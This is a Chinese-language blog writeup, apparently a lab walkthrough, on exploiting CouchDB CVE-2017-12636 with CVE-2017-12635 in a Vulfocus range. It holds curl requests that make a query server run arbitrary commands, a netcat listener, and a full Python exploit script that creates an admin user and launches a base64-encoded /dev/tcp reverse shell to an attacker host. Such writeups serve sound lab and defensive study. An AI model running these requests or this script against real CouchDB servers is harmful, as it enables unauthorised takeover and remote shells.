@@ -1,0 +1,96 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="墨竹星海"><meta name="copyright" content="墨竹星海"><meta name="generator" content="Hexo 4.2.1"><meta name="theme" content="hexo-theme-yun"><title>Vulfocus靶场couchdb远程代码执行CVE-2017-12636环境writeup | 墨竹星海’s Bolg</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;family=Source+Code+Pro&amp;display=swap" media="none" onload="this.media='all'"><script src="//at.alicdn.com/t/font_1140697_pem9yni52s.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+});
+</script><link rel="shortcut icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"root":"/","title":"云游君的小站","version":"0.9.0","anonymous_image":"/imgs/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><meta name="description" content="CVE-2017-12636是由于数据库自身设计原因，管理员身份可以通过HTTP（S）方式，配置数据库。在某些配置中，可设置可执行文件的路径，在数据库运行范围内执行。结合CVE-2017-12635可实现远程代码执行。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulfocus靶场couchdb远程代码执行CVE-2017-12636环境writeup">
+<meta property="og:url" content="https://www.mzxh.xyz/2020/05/17/20200517-2/index.html">
+<meta property="og:site_name" content="墨竹星海’s Bolg">
+<meta property="og:description" content="CVE-2017-12636是由于数据库自身设计原因，管理员身份可以通过HTTP（S）方式，配置数据库。在某些配置中，可设置可执行文件的路径，在数据库运行范围内执行。结合CVE-2017-12635可实现远程代码执行。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.mzxh.xyz/picture/20200515111605.png">
+<meta property="og:image" content="https://www.mzxh.xyz/picture/20200515111756.png">
+<meta property="og:image" content="https://www.mzxh.xyz/picture/20200515111844.png">
+<meta property="og:image" content="https://www.mzxh.xyz/picture/20200515112457.png">
+<meta property="og:image" content="https://www.mzxh.xyz/picture/20200515112524.png">
+<meta property="og:image" content="https://www.mzxh.xyz/picture/20200515190126.png">
+<meta property="og:image" content="https://www.mzxh.xyz/picture/20200515113359.png">
+<meta property="article:published_time" content="2020-05-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-05-18T13:16:17.745Z">
+<meta property="article:author" content="墨竹星海">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.mzxh.xyz/picture/20200515111605.png"></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle sidebar-toggle-fixed hty-icon-button"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><aside class="sidebar"><script defer src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/" title="墨竹星海"><img width="96" loading="lazy" src="/Yun.png" alt="墨竹星海"></a><div class="site-author-name"><a href="/">墨竹星海</a></div><a class="site-name" href="/">墨竹星海’s Bolg</a><sub class="site-subtitle">When you look long into an abyss,the abyss looks into you.</sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">49</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">10</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">16</span></a></div><a class="site-state-item hty-icon-button" href="https://wpa.qq.com/msgrd?v=3&amp;uin=910426929&amp;site=qq&amp;menu=yes" target="_blank" rel="noopener" title="腾讯QQ"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup"><span class="toc-number">1.</span> <span class="toc-text">writeup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反弹shell"><span class="toc-number">2.</span> <span class="toc-text">反弹shell</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://www.mzxh.xyz/2020/05/17/20200517-2/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="墨竹星海"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="墨竹星海’s Bolg"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Vulfocus靶场couchdb远程代码执行CVE-2017-12636环境writeup</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2020-05-17 00:00:00" itemprop="dateCreated datePublished" datetime="2020-05-17T00:00:00+08:00">2020-05-17</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="修改时间：2020-05-18 21:16:17" itemprop="dateModified" datetime="2020-05-18T21:16:17+08:00">2020-05-18</time></div><div class="post-classify"><span class="post-category"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span> <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/vulfocus%E9%9D%B6%E5%9C%BA/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">vulfocus靶场</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">漏洞复现</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content post-markdown"><p>CVE-2017-12636是由于数据库自身设计原因，管理员身份可以通过HTTP（S）方式，配置数据库。在某些配置中，可设置可执行文件的路径，在数据库运行范围内执行。结合CVE-2017-12635可实现远程代码执行。<a id="more"></a></p>
+<h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>访问靶场地址</p>
+<p><img src="https://www.mzxh.xyz/picture/20200515111605.png" alt="markdown" loading="lazy"></p>
+<p>可以看到couchdb版本是1.6.0</p>
+<p>访问https://靶场地址/_utils/</p>
+<p><img src="https://www.mzxh.xyz/picture/20200515111756.png" alt="markdown" loading="lazy"></p>
+<p>提示所有人均为管理员</p>
+<p>点击Fix this 创立管理员</p>
+<p><img src="https://www.mzxh.xyz/picture/20200515111844.png" alt="markdown" loading="lazy"></p>
+<p>依次执行如下请求即可触发任意命令执行：</p>
+<pre><code>curl -X PUT &#39;http://admin:admin@ctf.mzxh.xyz:58512/_config/query_servers/cmd&#39; -d &#39;&quot;id &gt;/tmp/success&quot;&#39;
+curl -X PUT &#39;http://admin:admin@ctf.mzxh.xyz:58512/vultest&#39;
+curl -X PUT &#39;http://admin:admin@ctf.mzxh.xyz:58512/vultest/vul&#39; -d &#39;{&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;}&#39;
+curl -X POST &#39;http://admin:admin@ctf.mzxh.xyz:58512/vultest/_temp_view?limit=10&#39; -d &#39;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&#39; -H &#39;Content-Type:application/json&#39;</code></pre><blockquote>
+<p><code>ctf.mzxh.xyz:58512</code>为你的靶场访问地址<br>第一个请求是添加一个名字为cmd的query_servers，<code>admin:admin</code>为你刚刚创建的管理员账号：密码；<code>id &gt;/tmp/success</code>为你要执行的命令<br>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。<br>第四个请求就是在这个Database里进行查询，因为我将language设置为cmd，这里就会用到我第一步里添加的名为cmd的query_servers，最后触发命令执行。</p>
+</blockquote>
+<p><img src="https://www.mzxh.xyz/picture/20200515112457.png" alt="markdown" loading="lazy"></p>
+<p>可以看到生成了success文件中包含了id返回信息</p>
+<p><img src="https://www.mzxh.xyz/picture/20200515112524.png" alt="markdown" loading="lazy"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>注意：直接反弹shell不成功。反弹Shell的命令，在经过数据库处理时被截断，不能直接执行，</p>
+<p>所以这里直接用exp打</p>
+<p>攻击机开启一个端口监听</p>
+<pre><code>nc -lvp 7777</code></pre><p><img src="https://www.mzxh.xyz/picture/20200515190126.png" alt="markdown" loading="lazy"></p>
+<p>运行exp脚本（需要修改下面几处）</p>
+<blockquote>
+<p>target = 你靶场的地址<br>command = rb”””sh -i &gt;&amp; /dev/tcp/你公网vps地址/端口 0&gt;&amp;1”””<br>version = 1(版本号1.x版本选1 2.x版本选2)</p>
+</blockquote>
+<pre><code>#!/usr/bin/env python3
+import requests
+import json
+import base64
+from requests.auth import HTTPBasicAuth
+
+target = &#39;http://ctf.mzxh.xyz:47787&#39;
+command = rb&quot;&quot;&quot;sh -i &gt;&amp; /dev/tcp/***.***.***.***/7777 0&gt;&amp;1&quot;&quot;&quot;
+version = 1
+
+session = requests.session()
+session.headers = {
+    &#39;Content-Type&#39;: &#39;application/json&#39;
+}
+# session.proxies = {
+#     &#39;http&#39;: &#39;http://127.0.0.1:8085&#39;
+# }
+session.put(target + &#39;/_users/org.couchdb.user:wooyun&#39;, data=&#39;&#39;&#39;{
+  &quot;type&quot;: &quot;user&quot;,
+  &quot;name&quot;: &quot;wooyun&quot;,
+  &quot;roles&quot;: [&quot;_admin&quot;],
+  &quot;roles&quot;: [],
+  &quot;password&quot;: &quot;wooyun&quot;
+}&#39;&#39;&#39;)
+
+session.auth = HTTPBasicAuth(&#39;wooyun&#39;, &#39;wooyun&#39;)
+
+command = &quot;bash -c &#39;{echo,%s}|{base64,-d}|{bash,-i}&#39;&quot; % base64.b64encode(command).decode()
+if version == 1:
+    session.put(target + (&#39;/_config/query_servers/cmd&#39;), data=json.dumps(command))
+else:
+    host = session.get(target + &#39;/_membership&#39;).json()[&#39;all_nodes&#39;][0]
+    session.put(target + &#39;/_node/{}/_config/query_servers/cmd&#39;.format(host), data=json.dumps(command))
+
+session.put(target + &#39;/wooyun&#39;)
+session.put(target + &#39;/wooyun/test&#39;, data=&#39;{&quot;_id&quot;: &quot;wooyuntest&quot;}&#39;)
+
+if version == 1:
+    session.post(target + &#39;/wooyun/_temp_view?limit=10&#39;, data=&#39;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&#39;)
+else:
+    session.put(target + &#39;/wooyun/_design/test&#39;, data=&#39;{&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:{&quot;wooyun&quot;:{&quot;map&quot;:&quot;&quot;} },&quot;language&quot;:&quot;cmd&quot;}&#39;)</code></pre><p><img src="https://www.mzxh.xyz/picture/20200515113359.png" alt="markdown" loading="lazy"></p>
+</div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>墨竹星海</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://www.mzxh.xyz/2020/05/17/20200517-2/" title="Vulfocus靶场couchdb远程代码执行CVE-2017-12636环境writeup">https://www.mzxh.xyz/2020/05/17/20200517-2/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2020/05/18/20200518/" rel="prev" title="Vulfocus靶场Jenkins远程代码执行CVE-2017-1000353环境writeup"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">Vulfocus靶场Jenkins远程代码执行CVE-2017-1000353环境writeup</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2020/05/17/20200517-4/" rel="next" title="Vulfocus靶场st2-045/st2-046远程命令执行CVE-2017-5638环境writeup"><span class="post-nav-text">Vulfocus靶场st2-045/st2-046远程命令执行CVE-2017-5638环境writeup</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div></main><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="http://www.beian.miit.gov.cn" target="_blank">浙ICP备19034345号</a></div><div class="copyright"><span>&copy; 2019 – 2020 </span><span class="with-love" id="animate"></span><span class="author"> 墨竹星海</span></div><div class="powered"><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_uv"></span>次</span><span class="footer-separator">| </span><span id="busuanzi_container_page_pv"> 本文总阅读量<span id="busuanzi_value_page_pv"></span>次</span></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div><script defer src="/js/utils.js"></script><script defer src="/js/hexo-theme-yun.js"></script></body></html>
